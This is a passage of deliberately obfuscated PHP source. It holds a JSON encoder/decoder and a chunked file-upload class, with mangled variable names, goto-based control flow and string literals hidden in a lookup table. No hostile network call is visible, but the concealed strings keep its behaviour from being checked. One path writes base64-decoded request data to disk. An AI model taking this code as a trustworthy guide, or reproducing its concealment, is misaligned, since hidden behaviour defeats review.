2])); $Bšæ’¿Ì += 2; $D—›ñ«ÛÁ = $this->utf82utf16($FäÇ¾•¬èø); $A¬ñ±ùÉ½ .= sprintf($cÓºõõâƒ›[1381], bin2hex($D—›ñ«ÛÁ)); break; case ($EææƒØİİ› & 248) == 240: $FäÇ¾•¬èø = pack($cÓºõõâƒ›[1380], $EææƒØİİ›, ord($F²ğäùÉĞ‘[$Bšæ’¿Ì + 1]), ord($F²ğäùÉĞ‘[$Bšæ’¿Ì + 2]), ord($F²ğäùÉĞ‘[$Bšæ’¿Ì + 3])); $Bšæ’¿Ì += 3; $D—›ñ«ÛÁ = $this->utf82utf16($FäÇ¾•¬èø); $A¬ñ±ùÉ½ .= sprintf($cÓºõõâƒ›[1381], bin2hex($D—›ñ«ÛÁ)); break; case ($EææƒØİİ› & 252) == 248: $FäÇ¾•¬èø = pack($cÓºõõâƒ›[1380], $EææƒØİİ›, ord($F²ğäùÉĞ‘[$Bšæ’¿Ì + 1]), ord($F²ğäùÉĞ‘[$Bšæ’¿Ì + 2]), ord($F²ğäùÉĞ‘[$Bšæ’¿Ì + 3]), ord($F²ğäùÉĞ‘[$Bšæ’¿Ì + 4])); $Bšæ’¿Ì += 4; $D—›ñ«ÛÁ = $this->utf82utf16($FäÇ¾•¬èø); $A¬ñ±ùÉ½ .= sprintf($cÓºõõâƒ›[1381], bin2hex($D—›ñ«ÛÁ)); break; case ($EææƒØİİ› & 254) == 252: $FäÇ¾•¬èø = pack($cÓºõõâƒ›[1380], $EææƒØİİ›, ord($F²ğäùÉĞ‘[$Bšæ’¿Ì + 1]), ord($F²ğäùÉĞ‘[$Bšæ’¿Ì + 2]), ord($F²ğäùÉĞ‘[$Bšæ’¿Ì + 3]), ord($F²ğäùÉĞ‘[$Bšæ’¿Ì + 4]), ord($F²ğäùÉĞ‘[$Bšæ’¿Ì + 5])); $Bšæ’¿Ì += 5; $D—›ñ«ÛÁ = $this->utf82utf16($FäÇ¾•¬èø); $A¬ñ±ùÉ½ .= sprintf($cÓºõõâƒ›[1381], bin2hex($D—›ñ«ÛÁ)); break; } } return $cÓºõõâƒ›[120] . $A¬ñ±ùÉ½ . $cÓºõõâƒ›[120]; case $cÓºõõâƒ›[1382]: if (is_array($F²ğäùÉĞ‘) && count($F²ğäùÉĞ‘) && array_keys($F²ğäùÉĞ‘) !== range(0, sizeof($F²ğäùÉĞ‘) - 1)) { $Fğ¤…ñ˜Éä = array_map(array($this, $cÓºõõâƒ›[1383]), array_keys($F²ğäùÉĞ‘), array_values($F²ğäùÉĞ‘)); foreach ($Fğ¤…ñ˜Éä as $d°šŸ®±èÉ) { if (Services_JSON::isError($d°šŸ®±èÉ)) { return $d°šŸ®±èÉ; } } return $cÓºõõâƒ›[815] . join($cÓºõõâƒ›[47], $Fğ¤…ñ˜Éä) . $cÓºõõâƒ›[326]; } $f®ˆ—œÕÕ® = array_map(array($this, $cÓºõõâƒ›[1384]), $F²ğäùÉĞ‘); foreach ($f®ˆ—œÕÕ® as $cÃ¼µÄëºø) { if (Services_JSON::isError($cÃ¼µÄëºø)) { return $cÃ¼µÄëºø; } } return $cÓºõõâƒ›[162] . join($cÓºõõâƒ›[47], $f®ˆ—œÕÕ®) . $cÓºõõâƒ›[523]; case $cÓºõõâƒ›[1385]: $f è†ÓŸ¼ = get_object_vars($F²ğäùÉĞ‘); $Fğ¤…ñ˜Éä = array_map(array($this, $cÓºõõâƒ›[1383]), array_keys($f è†ÓŸ¼), array_values($f è†ÓŸ¼)); foreach ($Fğ¤…ñ˜Éä as $d°šŸ®±èÉ) { if (Services_JSON::isError($d°šŸ®±èÉ)) { return $d°šŸ®±èÉ; } } return $cÓºõõâƒ›[815] . join($cÓºõõâƒ›[47], $Fğ¤…ñ˜Éä) . $cÓºõõâƒ›[326]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $cÓºõõâƒ›[108] : new Services_JSON_Error(gettype($F²ğäùÉĞ‘) . $cÓºõõâƒ›[1386]); } } function name_value($Eåçô¯Ûİ, $A‰½Ø°…Ø) { $a¢ê»›¸¼œ = $this->encode($A‰½Ø°…Ø); if (Services_JSON::isError($a¢ê»›¸¼œ)) { return $a¢ê»›¸¼œ; } return $this->encode(strval($Eåçô¯Ûİ)) . $_SERVER[°Óó£ÌİóèÅ][4] . $a¢ê»›¸¼œ; } function reduce_string($Aí«Ğòƒã‹) { $Bæß…‚¿¸ =& $_SERVER[°Óó£ÌİóèÅ]; $Aí«Ğòƒã‹ = preg_replace(array($Bæß…‚¿¸[1387], $Bæß…‚¿¸[1388], $Bæß…‚¿¸[1389]), $Bæß…‚¿¸[33], $Aí«Ğòƒã‹); return trim($Aí«Ğòƒã‹); } function decode($Cæë†–ÁÒ†) { $aÇí áõÒˆ =& $_SERVER[°Óó£ÌİóèÅ]; $Cæë†–ÁÒ† = $this->reduce_string($Cæë†–ÁÒ†); switch (strtolower($Cæë†–ÁÒ†)) { case $aÇí áõÒˆ[1372]: return !0; case $aÇí áõÒˆ[1373]: return !1; case $aÇí áõÒˆ[108]: return null; default: $Fšä¤àº× = array(); if (is_numeric($Cæë†–ÁÒ†)) { return (double) $Cæë†–ÁÒ† == (int) $Cæë†–ÁÒ† ? (int) $Cæë†–ÁÒ† : (double) $Cæë†–ÁÒ†; } elseif (preg_match($aÇí áõÒˆ[1390], $Cæë†–ÁÒ†, $Fšä¤àº×) && $Fšä¤àº×[1] == $Fšä¤àº×[2]) { $côğ­’Å‡ = substr($Cæë†–ÁÒ†, 0, 1); $BÌ®Š½ÌÔ­ = substr($Cæë†–ÁÒ†, 1, -1); $cãëŒÆé‡ê = $aÇí áõÒˆ[33]; $dó ‡®§»¸ = strlen($BÌ®Š½ÌÔ­); for ($a±¹½ºŞ©ê = 0; $a±¹½ºŞ©ê < $dó ‡®§»¸; ++$a±¹½ºŞ©ê) { $bÚéÒæàÍ¾ = substr($BÌ®Š½ÌÔ­, $a±¹½ºŞ©ê, 2); $F°æÀƒ°ò = ord($BÌ®Š½ÌÔ­[$a±¹½ºŞ©ê]); switch (!0) { case $bÚéÒæàÍ¾ == $aÇí áõÒˆ[1375]: $cãëŒÆé‡ê .= chr(8); ++$a±¹½ºŞ©ê; break; case $bÚéÒæàÍ¾ == $aÇí áõÒˆ[1376]: $cãëŒÆé‡ê .= chr(9); ++$a±¹½ºŞ©ê; break; case $bÚéÒæàÍ¾ == $aÇí áõÒˆ[1377]: $cãëŒÆé‡ê .= chr(10); ++$a±¹½ºŞ©ê; break; case $bÚéÒæàÍ¾ == $aÇí áõÒˆ[1378]: $cãëŒÆé‡ê .= chr(12); ++$a±¹½ºŞ©ê; break; case $bÚéÒæàÍ¾ == $aÇí áõÒˆ[1379]: $cãëŒÆé‡ê .= chr(13); ++$a±¹½ºŞ©ê; break; case $bÚéÒæàÍ¾ == $aÇí áõÒˆ[1013]: case $bÚéÒæàÍ¾ == $aÇí áõÒˆ[1391]: case $bÚéÒæàÍ¾ == $aÇí áõÒˆ[1392]: case $bÚéÒæàÍ¾ == $aÇí áõÒˆ[1393]: if ($côğ­’Å‡ == $aÇí áõÒˆ[120] && $bÚéÒæàÍ¾ != $aÇí áõÒˆ[1391] || $côğ­’Å‡ == $aÇí áõÒˆ[55] && $bÚéÒæàÍ¾ != $aÇí áõÒˆ[1013]) { $cãëŒÆé‡ê .= $BÌ®Š½ÌÔ­[++$a±¹½ºŞ©ê]; } break; case preg_match($aÇí áõÒˆ[1394], substr($BÌ®Š½ÌÔ­, $a±¹½ºŞ©ê, 6)): $dâ¡Üªªâ = chr(hexdec(substr($BÌ®Š½ÌÔ­, $a±¹½ºŞ©ê + 2, 2))) . chr(hexdec(substr($BÌ®Š½ÌÔ­, $a±¹½ºŞ©ê + 4, 2))); $cãëŒÆé‡ê .= $this->utf162utf8($dâ¡Üªªâ); $a±¹½ºŞ©ê += 5; break; case $F°æÀƒ°ò >= 32 && $F°æÀƒ°ò <= 127: $cãëŒÆé‡ê .= $BÌ®Š½ÌÔ­[$a±¹½ºŞ©ê]; break; case ($F°æÀƒ°ò & 224) == 192: $cãëŒÆé‡ê .= substr($BÌ®Š½ÌÔ­, $a±¹½ºŞ©ê, 2); ++$a±¹½ºŞ©ê; break; case ($F°æÀƒ°ò & 240) == 224: $cãëŒÆé‡ê .= substr($BÌ®Š½ÌÔ­, $a±¹½ºŞ©ê, 3); $a±¹½ºŞ©ê += 2; break; case ($F°æÀƒ°ò & 248) == 240: $cãëŒÆé‡ê .= substr($BÌ®Š½ÌÔ­, $a±¹½ºŞ©ê, 4); $a±¹½ºŞ©ê += 3; break; case ($F°æÀƒ°ò & 252) == 248: $cãëŒÆé‡ê .= substr($BÌ®Š½ÌÔ­, $a±¹½ºŞ©ê, 5); $a±¹½ºŞ©ê += 4; break; case ($F°æÀƒ°ò & 254) == 252: $cãëŒÆé‡ê .= substr($BÌ®Š½ÌÔ­, $a±¹½ºŞ©ê, 6); $a±¹½ºŞ©ê += 5; break; } } return $cãëŒÆé‡ê; } elseif (preg_match($aÇí áõÒˆ[1395], $Cæë†–ÁÒ†) || preg_match($aÇí áõÒˆ[1396], $Cæë†–ÁÒ†)) { goto BßÖÎ•˜¡Á; c‹™•¾¨Ïµ: $BÌ®Š½ÌÔ­ = $this->reduce_string($BÌ®Š½ÌÔ­); if ($BÌ®Š½ÌÔ­ == $aÇí áõÒˆ[33]) { if (reset($B«Ğï²Š) == SERVICES_JSON_IN_ARR) { return $B°ÊŸ¡ÊÆ“; } else { return $c­¬Œø¢º; } } $dó ‡®§»¸ = strlen($BÌ®Š½ÌÔ­); goto C¾ÇìŒÜÁˆ; C¾ÇìŒÜÁˆ: for ($a±¹½ºŞ©ê = 0; $a±¹½ºŞ©ê <= $dó ‡®§»¸; ++$a±¹½ºŞ©ê) { $a”Ëàİ³¯¬ = end($B«Ğï²Š); $bÚéÒæàÍ¾ = substr($BÌ®Š½ÌÔ­, $a±¹½ºŞ©ê, 2); if ($a±¹½ºŞ©ê == $dó ‡®§»¸ || $BÌ®Š½ÌÔ­[$a±¹½ºŞ©ê] == $aÇí áõÒˆ[47] && $a”Ëàİ³¯¬[$aÇí áõÒˆ[1397]] == SERVICES_JSON_SLICE) { $B¶õø­öÁ = substr($BÌ®Š½ÌÔ­, $a”Ëàİ³¯¬[$aÇí áõÒˆ[274]], $a±¹½ºŞ©ê - $a”Ëàİ³¯¬[$aÇí áõÒˆ[274]]); array_push($B«Ğï²Š, array($aÇí áõÒˆ[1397] => SERVICES_JSON_SLICE, $aÇí áõÒˆ[274] => $a±¹½ºŞ©ê + 1, $aÇí áõÒˆ[1398] => !1)); if (reset($B«Ğï²Š) == SERVICES_JSON_IN_ARR) { array_push($B°ÊŸ¡ÊÆ“, $this->decode($B¶õø­öÁ)); } elseif (reset($B«Ğï²Š) == SERVICES_JSON_IN_OBJ) { $C“‰š°‹Â› = array(); if (preg_match($aÇí áõÒˆ[1399], $B¶õø­öÁ, $C“‰š°‹Â›)) { $c ™ÇàÔÎÅ = $this->decode($C“‰š°‹Â›[1]); $E£ÙÖøŸ–Ñ = $this->decode($C“‰š°‹Â›[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $c­¬Œø¢º[$c ™ÇàÔÎÅ] = $E£ÙÖøŸ–Ñ; } else { $c­¬Œø¢º->{$c ™ÇàÔÎÅ} = $E£ÙÖøŸ–Ñ; } } elseif (preg_match($aÇí áõÒˆ[1400], $B¶õø­öÁ, $C“‰š°‹Â›)) { $c ™ÇàÔÎÅ = $C“‰š°‹Â›[1]; $E£ÙÖøŸ–Ñ = $this->decode($C“‰š°‹Â›[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $c­¬Œø¢º[$c ™ÇàÔÎÅ] = $E£ÙÖøŸ–Ñ; } else { $c­¬Œø¢º->{$c ™ÇàÔÎÅ} = $E£ÙÖøŸ–Ñ; } } } } elseif (($BÌ®Š½ÌÔ­[$a±¹½ºŞ©ê] == $aÇí áõÒˆ[120] || $BÌ®Š½ÌÔ­[$a±¹½ºŞ©ê] == $aÇí áõÒˆ[55]) && $a”Ëàİ³¯¬[$aÇí áõÒˆ[1397]] != SERVICES_JSON_IN_STR) { array_push($B«Ğï²Š, array($aÇí áõÒˆ[1397] => SERVICES_JSON_IN_STR, $aÇí áõÒˆ[274] => $a±¹½ºŞ©ê, $aÇí áõÒˆ[1398] => $BÌ®Š½ÌÔ­[$a±¹½ºŞ©ê])); } elseif ($BÌ®Š½ÌÔ­[$a±¹½ºŞ©ê] == $a”Ëàİ³¯¬[$aÇí áõÒˆ[1398]] && $a”Ëàİ³¯¬[$aÇí áõÒˆ[1397]] == SERVICES_JSON_IN_STR && (strlen(substr($BÌ®Š½ÌÔ­, 0, $a±¹½ºŞ©ê)) - strlen(rtrim(substr($BÌ®Š½ÌÔ­, 0, $a±¹½ºŞ©ê), $aÇí áõÒˆ[102]))) % 2 != 1) { array_pop($B«Ğï²Š); } elseif ($BÌ®Š½ÌÔ­[$a±¹½ºŞ©ê] == $aÇí áõÒˆ[162] && in_array($a”Ëàİ³¯¬[$aÇí áõÒˆ[1397]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($B«Ğï²Š, array($aÇí áõÒˆ[1397] => SERVICES_JSON_IN_ARR, $aÇí áõÒˆ[274] => $a±¹½ºŞ©ê, $aÇí áõÒˆ[1398] => !1)); } elseif ($BÌ®Š½ÌÔ­[$a±¹½ºŞ©ê] == $aÇí áõÒˆ[523] && $a”Ëàİ³¯¬[$aÇí áõÒˆ[1397]] == SERVICES_JSON_IN_ARR) { array_pop($B«Ğï²Š); } elseif ($BÌ®Š½ÌÔ­[$a±¹½ºŞ©ê] == $aÇí áõÒˆ[815] && in_array($a”Ëàİ³¯¬[$aÇí áõÒˆ[1397]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($B«Ğï²Š, array($aÇí áõÒˆ[1397] => SERVICES_JSON_IN_OBJ, $aÇí áõÒˆ[274] => $a±¹½ºŞ©ê, $aÇí áõÒˆ[1398] => !1)); } elseif ($BÌ®Š½ÌÔ­[$a±¹½ºŞ©ê] == $aÇí áõÒˆ[326] && $a”Ëàİ³¯¬[$aÇí áõÒˆ[1397]] == SERVICES_JSON_IN_OBJ) { array_pop($B«Ğï²Š); } elseif ($bÚéÒæàÍ¾ == $aÇí áõÒˆ[1401] && in_array($a”Ëàİ³¯¬[$aÇí áõÒˆ[1397]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($B«Ğï²Š, array($aÇí áõÒˆ[1397] => SERVICES_JSON_IN_CMT, $aÇí áõÒˆ[274] => $a±¹½ºŞ©ê, $aÇí áõÒˆ[1398] => !1)); $a±¹½ºŞ©ê++; } elseif ($bÚéÒæàÍ¾ == $aÇí áõÒˆ[1402] && $a”Ëàİ³¯¬[$aÇí áõÒˆ[1397]] == SERVICES_JSON_IN_CMT) { array_pop($B«Ğï²Š); $a±¹½ºŞ©ê++; for ($EŞ«’ŞÅÈä = $a”Ëàİ³¯¬[$aÇí áõÒˆ[274]]; $EŞ«’ŞÅÈä <= $a±¹½ºŞ©ê; ++$EŞ«’ŞÅÈä) { $BÌ®Š½ÌÔ­ = substr_replace($BÌ®Š½ÌÔ­, $aÇí áõÒˆ[50], $EŞ«’ŞÅÈä, 1); } } } if (reset($B«Ğï²Š) == SERVICES_JSON_IN_ARR) { return $B°ÊŸ¡ÊÆ“; } elseif (reset($B«Ğï²Š) == SERVICES_JSON_IN_OBJ) { return $c­¬Œø¢º; } goto FÒö‹ƒÁğ»; BßÖÎ•˜¡Á: if ($Cæë†–ÁÒ†[0] == $aÇí áõÒˆ[162]) { $B«Ğï²Š = array(SERVICES_JSON_IN_ARR); $B°ÊŸ¡ÊÆ“ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $B«Ğï²Š = array(SERVICES_JSON_IN_OBJ); $c­¬Œø¢º = array(); } else { $B«Ğï²Š = array(SERVICES_JSON_IN_OBJ); $c­¬Œø¢º = new stdClass(); } } array_push($B«Ğï²Š, array($aÇí áõÒˆ[1397] => SERVICES_JSON_SLICE, $aÇí áõÒˆ[274] => 0, $aÇí áõÒˆ[1398] => !1)); $BÌ®Š½ÌÔ­ = substr($Cæë†–ÁÒ†, 1, -1); goto c‹™•¾¨Ïµ; FÒö‹ƒÁğ»: } } } function isError($aç®ˆÍ÷Æí, $DíëÖ„¢² = null) { $A¥¶‰©­Ò =& $_SERVER[°Óó£ÌİóèÅ]; if (class_exists($A¥¶‰©­Ò[1403])) { return PEAR::isError($aç®ˆÍ÷Æí, $DíëÖ„¢²); } elseif (is_object($aç®ˆÍ÷Æí) && (get_class($aç®ˆÍ÷Æí) == $A¥¶‰©­Ò[1404] || is_subclass_of($aç®ˆÍ÷Æí, $A¥¶‰©­Ò[1404]))) { return !0; } return !1; } } if (class_exists($_SERVER[°Óó£ÌİóèÅ][1405])) { class Services_JSON_Error extends PEAR_Error { function __construct($f¹ÚÛ‘¾ë = "\165\x6e\x6b\x6e\157\x77\156\x20\x65\x72\x72\x6f\x72", $eĞöç‘Â” = null, $eÂ©ÄŸ‰ï = null, $aİÍ¥©¡˜Ş = null, $B°Œ¿ÌºÇÅ = null) { parent::PEAR_Error($f¹ÚÛ‘¾ë, $eĞöç‘Â”, $eÂ©ÄŸ‰ï, $aİÍ¥©¡˜Ş, $B°Œ¿ÌºÇÅ); } } } else { class Services_JSON_Error { function __construct($c»Ï‘¾ŒÛ² = "\x75\156\153\156\157\x77\x6e\x20\145\162\162\x6f\162", $dæÁâòÁ§ = null, $eÏÜÔ‡ ² = null, $dï£ÊåÏˆÕ = null, $f«ß»±˜´¹ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto B°Âò•ä‚Ù; d¼ùİ×ßÂ÷: $this->checkSize(); $this->tempPathInit(); goto aÎ· ëŠØ; CÈ—ñó×ù: if (!empty($_FILES)) { $Aã¬Ü¦á®µ = $_FILES[$bëôÓÀê†[172]]; $this->uploadFile = $Aã¬Ü¦á®µ[$bëôÓÀê†[1406]]; if (!$this->uploadFile && $Aã¬Ü¦á®µ[$bëôÓÀê†[956]] > 0) { show_json($this->errorInfo($Aã¬Ü¦á®µ[$bëôÓÀê†[956]]), !1); } } else { if (isset($in[$bëôÓÀê†[395]])) { $this->uploadFile = isset($in[$bëôÓÀê†[1407]]) ? $bëôÓÀê†[1408] : $bëôÓÀê†[1242]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto d¼ùİ×ßÂ÷; B°Âò•ä‚Ù: $bëôÓÀê† =& $_SERVER[°Óó£ÌİóèÅ]; global $in; $this->in =& $in; goto CÈ—ñó×ù; aÎ· ëŠØ: } public function upload() { goto cÁ‡‘Ê™ã‘; B›Åó“’ÎĞ: $ešğÊ°•’Û = @fopen($this->tempFile, $aßÌŞ¸ŒÄ[1415]); fseek($ešğÊ°•’Û, $D×ù™Ùİ†); $DõÔï‰ ßÊ = $this->writeTo($fŸÙ¬²‚‡ƒ, $ešğÊ°•’Û, $this->tempFile); goto eÕÊàà°ğ”; dàèÎÒå¿: $E¨Ê¦†‰Ë™ = $this->tempFile . $aßÌŞ¸ŒÄ[1411] . $fòîö¬„è²; $bç¬ßÊÛŞ = isset($this->in[$aßÌŞ¸ŒÄ[399]]) ? intval($this->in[$aßÌŞ¸ŒÄ[399]]) : 0; $fÈ´ÛÇñæÂ = isset($this->in[$aßÌŞ¸ŒÄ[1412]]) ? intval($this->in[$aßÌŞ¸ŒÄ[1412]]) : 0; goto a§¥Ù‚® œ; Dç²ã¹÷¿Á: return $this->tempFile; goto AœŒàå¶˜ß; eÕÊàà°ğ”: $C•á‘É¸‚’ = IO::hashSimple($fŸÙ¬²‚‡ƒ); $bç¬ßÊÛŞ = IO::size($fŸÙ¬²‚‡ƒ); @unlink($fŸÙ¬²‚‡ƒ); goto bâÂÃÆµ‘; fåÜÌ„î˜: $this->statusSet($BâÆÀ¢¸öƒ); if (count($BâÆÀ¢¸öƒ[$aßÌŞ¸ŒÄ[1418]]) != $BâÆÀ¢¸öƒ[$aßÌŞ¸ŒÄ[1417]]) { $this->showJson($aßÌŞ¸ŒÄ[1421] . $fòîö¬„è², !0); } ignore_timeout(); goto Eìò¸êÎ×Ò; a§¥Ù‚® œ: if ($B‘…áÙ¶Ê• > 1 && $fÈ´ÛÇñæÂ <= 0) { show_json($aßÌŞ¸ŒÄ[1413], !1); } if ($fÈ´ÛÇñæÂ > $bç¬ßÊÛŞ) { $B‘…áÙ¶Ê• = 1; } if ($B‘…áÙ¶Ê• <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto AÁ¯ŠˆÄË†; AÁ¯ŠˆÄË†: CacheLock::lock($this->tempFile, 20); $BâÆÀ¢¸öƒ = $this->statusGet(); $this->initFileTemp(); goto B£°…‘œëƒ; B£°…‘œëƒ: $fŸÙ¬²‚‡ƒ = $this->moveUploadedFile($E¨Ê¦†‰Ë™); if (!$fŸÙ¬²‚‡ƒ) { $this->showJson(LNG($aßÌŞ¸ŒÄ[1414]), !1); } $D×ù™Ùİ† = $fòîö¬„è² * $fÈ´ÛÇñæÂ; goto B›Åó“’ÎĞ; bâÂÃÆµ‘: if (!$DõÔï‰ ßÊ) { $this->showJson($aßÌŞ¸ŒÄ[1416] . $fòîö¬„è², !1); } $BâÆÀ¢¸öƒ[$aßÌŞ¸ŒÄ[1417]] = $B‘…áÙ¶Ê•; $BâÆÀ¢¸öƒ[$aßÌŞ¸ŒÄ[1418]][$aßÌŞ¸ŒÄ[1419] . $fòîö¬„è²] = array($aßÌŞ¸ŒÄ[1420] => $D×ù™Ùİ†, $aßÌŞ¸ŒÄ[785] => $fòîö¬„è², $aßÌŞ¸ŒÄ[86] => $bç¬ßÊÛŞ, $aßÌŞ¸ŒÄ[169] => $C•á‘É¸‚’); goto fåÜÌ„î˜; cÁ‡‘Ê™ã‘: $aßÌŞ¸ŒÄ =& $_SERVER[°Óó£ÌİóèÅ]; $fòîö¬„è² = isset($this->in[$aßÌŞ¸ŒÄ[1409]]) ? intval($this->in[$aßÌŞ¸ŒÄ[1409]]) : 0; $B‘…áÙ¶Ê• = isset($this->in[$aßÌŞ¸ŒÄ[1410]]) ? intval($this->in[$aßÌŞ¸ŒÄ[1410]]) : 1; goto dàèÎÒå¿; Eìò¸êÎ×Ò: if (!$this->checkChunkHash($BâÆÀ¢¸öƒ)) { $this->showJson($aßÌŞ¸ŒÄ[1422], !1); } $this->statusSet(!1); CacheLock::unlock($this->tempFile); goto Dç²ã¹÷¿Á; AœŒàå¶˜ß: } private function checkSize() { $fá›Û’‰÷‘ =& $_SERVER[°Óó£ÌİóèÅ]; if (phpBuild64() || $this->in[$fá›Û’‰÷‘[86]] < PHP_INT_MAX) { return; } show_json(LNG($fá›Û’‰÷‘[1423]), !1); } private function showJson($cë‰šŞ‘›Ç, $cîßš‡Å¹) { CacheLock::unlock($this->tempFile); if (!$cîßš‡Å¹) { return show_json($cë‰šŞ‘›Ç, $cîßš‡Å¹); } show_json($cë‰šŞ‘›Ç, $cîßš‡Å¹); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto BŒ”Ç¥ÇåË; bÌê“¬¼ƒÈ: $this->tempFile = $d•Éµ¿Ğ–¯ . $Dì‘‚Œ“ä[1426] . md5($E·†˜Õİ³½ . $this->in[$Dì‘‚Œ“ä[1427]]); goto FŒôÔ™ä; BŒ”Ç¥ÇåË: $Dì‘‚Œ“ä =& $_SERVER[°Óó£ÌİóèÅ]; $d•Éµ¿Ğ–¯ = TEMP_FILES; @mk_dir($d•Éµ¿Ğ–¯); goto Aƒï„ğš¼†; Aƒï„ğš¼†: touch($d•Éµ¿Ğ–¯ . $Dì‘‚Œ“ä[1424]); $E·†˜Õİ³½ = isset($this->in[$Dì‘‚Œ“ä[1425]]) ? $this->in[$Dì‘‚Œ“ä[1425]] : !1; if (strlen($E·†˜Õİ³½) < 30) { $E·†˜Õİ³½ = md5(USER_ID . $this->in[$Dì‘‚Œ“ä[84]] . $this->fileName . $this->in[$Dì‘‚Œ“ä[86]]); } goto bÌê“¬¼ƒÈ; FŒôÔ™ä: } private function moveUploadedFile($aë…»µäËŒ) { $cš½¹®¹ =& $_SERVER[°Óó£ÌİóèÅ]; $EÊî‡‚™Ö = $this->uploadFile; if ($EÊî‡‚™Ö == $cš½¹®¹[1428]) { @file_put_contents($aë…»µäËŒ, base64_decode($_REQUEST[$cš½¹®¹[1429]])); } else { if ($EÊî‡‚™Ö == $cš½¹®¹[1242]) { $B„ÊÑ¨Ş‰‘ = @fopen($aë…»µäËŒ, $cš½¹®¹[1168]); $this->writeTo($EÊî‡‚™Ö, $B„ÊÑ¨Ş‰‘, $aë…»µäËŒ); } else { if (!move_uploaded_file($EÊî‡‚™Ö, $aë…»µäËŒ)) { return !1; } } } return $aë…»µäËŒ; } private function writeTo($AÖÎÇ“ÙÔ, $eì§£˜ˆ‚, $FšÆá¥š…) { goto A†Ğì‘×‹; A†Ğì‘×‹: $bø³‰î††Õ =& $_SERVER[°Óó£ÌİóèÅ]; $CØÚçæ¿¹ = $bø³‰î††Õ[1430] . $FšÆá¥š…; $C¨’Ã¶ßÒ‡ = CacheLock::lock($CØÚçæ¿¹, 1); goto AëğŒˆ¤Œ; fØîÇ¾Ş·Ğ: return !0; goto d²š«Ô©¬; AëğŒˆ¤Œ: $BÎöÕï¬Ã¹ = @fopen($AÖÎÇ“ÙÔ, $bø³‰î††Õ[1167]); if (!$BÎöÕï¬Ã¹ || !$eì§£˜ˆ‚ || !$C¨’Ã¶ßÒ‡) { CacheLock::unlock($CØÚçæ¿¹); return !1; } while (!feof($BÎöÕï¬Ã¹)) { fwrite($eì§£˜ˆ‚, fread($BÎöÕï¬Ã¹, 1024 * 200)); } goto a¤‘ìñ®ˆß; a¤‘ìñ®ˆß: fclose($BÎöÕï¬Ã¹); fclose($eì§£˜ˆ‚); CacheLock::unlock($CØÚçæ¿¹); goto fØîÇ¾Ş·Ğ; d²š«Ô©¬: } private function statusGet() { goto cš½Â‘é–Ò; cš½Â‘é–Ò: $CŞ¾Ïè‡‚„ =& $_SERVER[°Óó£ÌİóèÅ]; if (is_array($this->statusData)) { return $this->statusData; } $dîÆƒÃ‚Ö = $this->tempFile . $CŞ¾Ïè‡‚„[1431]; goto a‚Ë·‰§ßÂ; a«¡ÃŞâÁ: if (!$this->statusData) { $däš±à÷œ = array($CŞ¾Ïè‡‚„[28] => $this->fileName, $CŞ¾Ïè‡‚„[1417] => 0, $CŞ¾Ïè‡‚„[1418] => array()); $this->statusSet($däš±à÷œ); } return $this->statusData; goto F±ÑÎ¢Õô; a‚Ë·‰§ßÂ: $CôÀ›’âª¸ = !1; if (file_exists($dîÆƒÃ‚Ö)) { $CôÀ›’âª¸ = @file_get_contents($dîÆƒÃ‚Ö); } if ($CôÀ›’âª¸) { $this->statusData = unserialize($CôÀ›’âª¸); } goto a«¡ÃŞâÁ; F±ÑÎ¢Õô: } public function statusSet($eÉÅ¥’Ë˜é) { $f¿ñÎ§â§“ = $this->tempFile . $_SERVER[°Óó£ÌİóèÅ][1431]; if (!$eÉÅ¥’Ë˜é) { if (file_exists($f¿ñÎ§â§“)) { @unlink($f¿ñÎ§â§“); } return !0; } $this->statusData = $eÉÅ¥’Ë˜é; return file_put_contents($f¿ñÎ§â§“, serialize($eÉÅ¥’Ë˜é)); } private function initFileTemp() { $f¦¨Ú«ø‹ =& $_SERVER[°Óó£ÌİóèÅ]; if (file_exists($this->tempFile)) { return; } $EÀ•¢â‘ ¹ = fopen($this->tempFile, $f¦¨Ú«ø‹[1432]); fseek($EÀ•¢â‘ ¹, $this->in[$f¦¨Ú«ø‹[86]] - 1, SEEK_SET); fwrite($EÀ•¢â‘ ¹, $f¦¨Ú«ø‹[410]); fclose($EÀ•¢â‘ ¹); } public function checkChunk() { goto eçíÍµîÜ; eçíÍµîÜ: $dÜ‰çöÁÌ =& $_SERVER[°Óó£ÌİóèÅ]; $bİë…Äƒ¥ = array(); CacheLock::lock($this->tempFile); goto dãÈ›÷½¹°; dãÈ›÷½¹°: $eŞÁÓ¶¼ » = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($eŞÁÓ¶¼ »[$dÜ‰çöÁÌ[1418]] as $Fî¿¬Ø×Î˜) { $AØÒéØÑë = $Fî¿¬Ø×Î˜[$dÜ‰çöÁÌ[169]]; if ($AØÒéØÑë) { $bİë…Äƒ¥[$dÜ‰çöÁÌ[1433] . $Fî¿¬Ø×Î˜[$dÜ‰çöÁÌ[785]]] = $AØÒéØÑë; } } goto EÈ´‚ƒº½³; EÈ´‚ƒº½³: return $bİë…Äƒ¥; goto A­íÂ©†ôî; A­íÂ©†ôî: } private function checkChunkHash($dÈ…‘âÊÕ ) { goto eğÈŞÖ™×†; bøŒÇõ‘ëß: $Fø´½‚îòº = !0; foreach ($dÈ…‘âÊÕ [$Cóßç®¯š½[1418]] as $eâ²Ü¶ãğ) { fseek($EÀ»‚Âê¯ç, $eâ²Ü¶ãğ[$Cóßç®¯š½[1420]]); $c’Š–¼¾¹Ş = PathDriverStream::hash($EÀ»‚Âê¯ç, $eâ²Ü¶ãğ[$Cóßç®¯š½[86]]); if ($eâ²Ü¶ãğ[$Cóßç®¯š½[169]] != $c’Š–¼¾¹Ş) { $Fø´½‚îòº = !1; break; } } fclose($EÀ»‚Âê¯ç); goto C¬¯ËÊèš¸; 